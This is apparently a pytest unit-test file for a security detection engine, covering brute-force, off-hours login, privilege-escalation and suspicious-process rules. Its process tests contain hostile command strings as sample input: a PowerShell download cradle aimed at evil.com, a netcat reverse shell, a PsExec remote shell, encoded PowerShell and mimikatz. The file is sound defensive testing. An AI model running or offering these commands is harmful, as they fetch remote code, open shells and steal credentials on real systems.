"""
Unit tests for the detection engine.

Tests cover:
- Rule 1: Brute-force detection (threshold, window, below-threshold).
- Rule 2: Unusual login time (normal hours, off-hours, authorized schedules).
- Rule 3: Privilege escalation (trigger types).
- Rule 4: Suspicious process (name matching, argument matching, allowlist).
- Engine orchestration (all rules combined).
"""

import os
import sys
from datetime import datetime, timedelta, timezone

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.config import AegisConfig, AuthorizedSchedule
from app.schemas.events import NormalizedEvent, EventSource
from app.detection.rules import (
    detect_brute_force,
    detect_unusual_login_time,
    detect_privilege_escalation,
    detect_suspicious_process,
    reset_detection_counter,
)
from app.detection.engine import run_detection


def _make_event(
    event_id: str,
    event_type: str,
    user: str = "alice",
    device: str = "WS-001",
    ip: str = "192.168.1.10",
    timestamp: datetime | None = None,
    process: str | None = None,
    source: EventSource = EventSource.AUTHENTICATION,
) -> NormalizedEvent:
    """Helper to create test events."""
    if timestamp is None:
        timestamp = datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc)
    return NormalizedEvent(
        event_id=event_id,
        timestamp=timestamp,
        user=user,
        device=device,
        ip=ip,
        event_type=event_type,
        process=process,
        source=source,
        raw_data={"test": True},
    )


class TestBruteForceDetection:
    def setup_method(self):
        reset_detection_counter(0)
        self.config = AegisConfig()

    def test_five_failures_triggers(self):
        """5 failures within 10 minutes MUST trigger brute-force detection."""
        base = datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc)
        events = [
            _make_event(f"E{i:06d}", "login_failure", user="alice",
                        timestamp=base + timedelta(minutes=i))
            for i in range(5)
        ]
        detections = detect_brute_force(events, self.config)
        assert len(detections) == 1
        assert detections[0].rule_name == "brute_force_login"
        assert detections[0].user == "alice"
        assert len(detections[0].event_ids) == 5

    def test_four_failures_does_not_trigger(self):
        """4 failures within 10 minutes must NOT trigger (below threshold)."""
        base = datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc)
        events = [
            _make_event(f"E{i:06d}", "login_failure", user="alice",
                        timestamp=base + timedelta(minutes=i))
            for i in range(4)
        ]
        detections = detect_brute_force(events, self.config)
        assert len(detections) == 0

    def test_two_failures_does_not_trigger(self):
        """2 failures within 10 minutes must NOT trigger."""
        base = datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc)
        events = [
            _make_event(f"E{i:06d}", "login_failure", user="alice",
                        timestamp=base + timedelta(minutes=i))
            for i in range(2)
        ]
        detections = detect_brute_force(events, self.config)
        assert len(detections) == 0

    def test_different_users_not_combined(self):
        """Failures from different users must not be combined."""
        base = datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc)
        events = []
        # 3 failures for alice, 3 for bob — neither reaches 5
        for i in range(3):
            events.append(_make_event(f"E{i:06d}", "login_failure", user="alice",
                                      timestamp=base + timedelta(minutes=i)))
        for i in range(3):
            events.append(_make_event(f"E{10+i:06d}", "login_failure", user="bob",
                                      timestamp=base + timedelta(minutes=i)))

        detections = detect_brute_force(events, self.config)
        assert len(detections) == 0

    def test_failures_outside_window_dont_trigger(self):
        """5 failures spread over 30 minutes (outside 10-min window) should not trigger."""
        base = datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc)
        events = [
            _make_event(f"E{i:06d}", "login_failure", user="alice",
                        timestamp=base + timedelta(minutes=i * 7))  # 0, 7, 14, 21, 28
            for i in range(5)
        ]
        detections = detect_brute_force(events, self.config)
        assert len(detections) == 0

    def test_seven_failures_triggers(self):
        """7 failures within 5 minutes (exceeds threshold)."""
        base = datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc)
        events = [
            _make_event(f"E{i:06d}", "login_failure", user="charlie",
                        timestamp=base + timedelta(seconds=i * 40))
            for i in range(7)
        ]
        detections = detect_brute_force(events, self.config)
        assert len(detections) == 1
        assert detections[0].user == "charlie"


class TestUnusualLoginTimeDetection:
    def setup_method(self):
        reset_detection_counter(0)
        self.config = AegisConfig()

    def test_normal_hours_no_detection(self):
        """Login at 10:00 (within 08:00-20:00) should NOT trigger."""
        events = [
            _make_event("E000001", "login_success",
                        timestamp=datetime(2024, 11, 18, 10, 0, 0, tzinfo=timezone.utc))
        ]
        detections = detect_unusual_login_time(events, self.config)
        assert len(detections) == 0

    def test_off_hours_triggers(self):
        """Login at 03:00 (outside 08:00-20:00) SHOULD trigger."""
        events = [
            _make_event("E000001", "login_success", user="bob",
                        timestamp=datetime(2024, 11, 18, 3, 0, 0, tzinfo=timezone.utc))
        ]
        detections = detect_unusual_login_time(events, self.config)
        assert len(detections) == 1
        assert detections[0].rule_name == "unusual_login_time"
        assert detections[0].user == "bob"

    def test_authorized_schedule_exemption(self):
        """Admin with 24/7 authorized schedule should NOT trigger at 02:00."""
        self.config.authorized_schedules.append(AuthorizedSchedule(
            user="admin",
            days=["MON", "TUE", "WED", "THU", "FRI", "SAT", "SUN"],
            start="00:00",
            end="23:59",
            timezone="UTC",
        ))

        events = [
            _make_event("E000001", "login_success", user="admin",
                        timestamp=datetime(2024, 11, 19, 2, 0, 0, tzinfo=timezone.utc))
            # Nov 19, 2024 is a Tuesday
        ]
        detections = detect_unusual_login_time(events, self.config)
        assert len(detections) == 0

    def test_non_login_events_ignored(self):
        """Non-login events at odd hours should NOT trigger."""
        events = [
            _make_event("E000001", "file_access",
                        timestamp=datetime(2024, 11, 18, 3, 0, 0, tzinfo=timezone.utc))
        ]
        detections = detect_unusual_login_time(events, self.config)
        assert len(detections) == 0


class TestPrivilegeEscalationDetection:
    def setup_method(self):
        reset_detection_counter(0)
        self.config = AegisConfig()

    def test_privilege_escalation_detected(self):
        events = [
            _make_event("E000001", "privilege_escalation", user="alice",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_privilege_escalation(events, self.config)
        assert len(detections) == 1
        assert detections[0].rule_name == "privilege_escalation"

    def test_admin_privileges_granted(self):
        events = [
            _make_event("E000001", "admin_privileges_granted", user="bob",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_privilege_escalation(events, self.config)
        assert len(detections) == 1

    def test_sudo_elevation(self):
        events = [
            _make_event("E000001", "sudo_elevation", user="charlie",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_privilege_escalation(events, self.config)
        assert len(detections) == 1

    def test_normal_login_not_detected(self):
        events = [
            _make_event("E000001", "login_success", user="alice")
        ]
        detections = detect_privilege_escalation(events, self.config)
        assert len(detections) == 0


class TestSuspiciousProcessDetection:
    def setup_method(self):
        reset_detection_counter(0)
        self.config = AegisConfig()

    def test_mimikatz_detected(self):
        events = [
            _make_event("E000001", "process_start", user="attacker",
                        process="mimikatz.exe", source=EventSource.ENDPOINT)
        ]
        detections = detect_suspicious_process(events, self.config)
        assert len(detections) == 1
        assert detections[0].rule_name == "suspicious_process"
        assert "mimikatz" in detections[0].explanation.lower()

    def test_psexec_detected(self):
        events = [
            _make_event("E000001", "process_start", user="attacker",
                        process="psexec.exe \\\\SRV-DC01 cmd",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_suspicious_process(events, self.config)
        assert len(detections) == 1

    def test_encoded_powershell_detected(self):
        events = [
            _make_event("E000001", "process_start", user="attacker",
                        process="powershell.exe -enc SQBFAFgA",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_suspicious_process(events, self.config)
        assert len(detections) == 1
        assert detections[0].confidence == "medium"  # Arg match, not name match

    def test_downloadstring_detected(self):
        events = [
            _make_event("E000001", "process_start",
                        process="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_suspicious_process(events, self.config)
        assert len(detections) == 1

    def test_normal_powershell_not_detected(self):
        """Normal PowerShell usage (Get-Process) should NOT trigger."""
        events = [
            _make_event("E000001", "process_start",
                        process="powershell.exe -Command Get-Process",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_suspicious_process(events, self.config)
        assert len(detections) == 0

    def test_no_process_field_ignored(self):
        events = [
            _make_event("E000001", "process_start",
                        process=None, source=EventSource.ENDPOINT)
        ]
        detections = detect_suspicious_process(events, self.config)
        assert len(detections) == 0

    def test_netcat_detected(self):
        events = [
            _make_event("E000001", "process_start",
                        process="nc.exe -e cmd.exe 10.0.0.1 4444",
                        source=EventSource.ENDPOINT)
        ]
        detections = detect_suspicious_process(events, self.config)
        assert len(detections) == 1


class TestDetectionEngine:
    def test_all_rules_run(self):
        """Engine should run all 4 rules and return combined detections."""
        base = datetime(2024, 11, 18, 3, 0, 0, tzinfo=timezone.utc)
        events = []

        # Brute force (5 failures)
        for i in range(5):
            events.append(_make_event(
                f"E{i:06d}", "login_failure", user="alice",
                timestamp=base + timedelta(minutes=i)
            ))

        # Off-hours login (03:00 is outside 08:00-20:00)
        events.append(_make_event(
            "E000010", "login_success", user="bob",
            timestamp=base + timedelta(minutes=10)
        ))

        # Privilege escalation
        events.append(_make_event(
            "E000020", "privilege_escalation", user="charlie",
            timestamp=base + timedelta(minutes=15),
            source=EventSource.ENDPOINT
        ))

        # Suspicious process
        events.append(_make_event(
            "E000030", "process_start", user="dave",
            process="mimikatz.exe",
            timestamp=base + timedelta(minutes=20),
            source=EventSource.ENDPOINT
        ))

        config = AegisConfig()
        detections = run_detection(events, config)

        rule_names = {d.rule_name for d in detections}
        assert "brute_force_login" in rule_names
        assert "unusual_login_time" in rule_names
        assert "privilege_escalation" in rule_names
        assert "suspicious_process" in rule_names
